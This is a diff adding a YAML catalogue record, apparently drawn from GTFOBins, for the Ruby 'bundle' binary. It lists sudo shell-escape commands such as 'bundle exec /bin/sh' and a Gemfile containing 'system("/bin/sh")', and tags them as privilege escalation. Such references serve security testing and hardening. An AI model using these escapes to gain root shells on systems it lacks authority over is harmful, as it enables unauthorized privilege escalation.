@@ -1,0 +1,114 @@
+id: gtfobins/bundle/shell/sudo
+type: binary
+platform: linux
+name: bundle
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+aliases:
+- bundler
+commands:
+- template: BUNDLE_GEMFILE=x bundle exec /bin/sh
+- template: 'touch Gemfile
+
+    bundle exec /bin/sh'
+- template: 'echo ''system("/bin/sh")'' >Gemfile
+
+    bundle install'
+  comment: This might run the shell twice, one after the other.
+references:
+- https://gtfobins.github.io/gtfobins/bundle/
+- https://gtfobins.github.io/gtfobins/bundler/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        bundle:
+          functions:
+            inherit:
+            - code: bundle help
+              contexts:
+                sudo: null
+                unprivileged: null
+              from: less
+            - code: 'touch Gemfile
+
+                bundle console'
+              contexts:
+                sudo: null
+                unprivileged: null
+              from: irb
+            shell:
+            - code: BUNDLE_GEMFILE=x bundle exec /bin/sh
+              contexts:
+                sudo: null
+                unprivileged: null
+            - code: 'touch Gemfile
+
+                bundle exec /bin/sh'
+              contexts:
+                sudo: null
+                unprivileged: null
+            - code: 'echo ''system("/bin/sh")'' >Gemfile
+
+                bundle install'
+              comment: This might run the shell twice, one after the other.
+              contexts:
+                sudo: null
+                unprivileged: null
+        bundler:
+          alias: bundle
+    upstream_url: https://gtfobins.github.io/gtfobins/bundle/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: shell
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:f29289c4c2cfbfa2d96142db4572fdda627bb6bec3a5c48b43e80f7e6a84e9eb
